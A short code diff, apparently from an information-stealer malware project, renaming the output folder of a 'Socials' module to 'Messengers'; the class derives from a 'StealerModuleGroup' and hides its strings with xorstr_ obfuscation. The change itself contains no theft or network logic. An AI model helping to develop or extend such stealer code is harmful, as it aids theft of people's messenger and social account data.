@@ -15,6 +15,6 @@ Socials::Socials()
 }
 
 void Socials::execute(fs::path &root) {
-    fs::path socials_path = root / xorstr_("Socials");
+    fs::path socials_path = root / xorstr_("Messengers");
     StealerModuleGroup::execute(socials_path);
 }
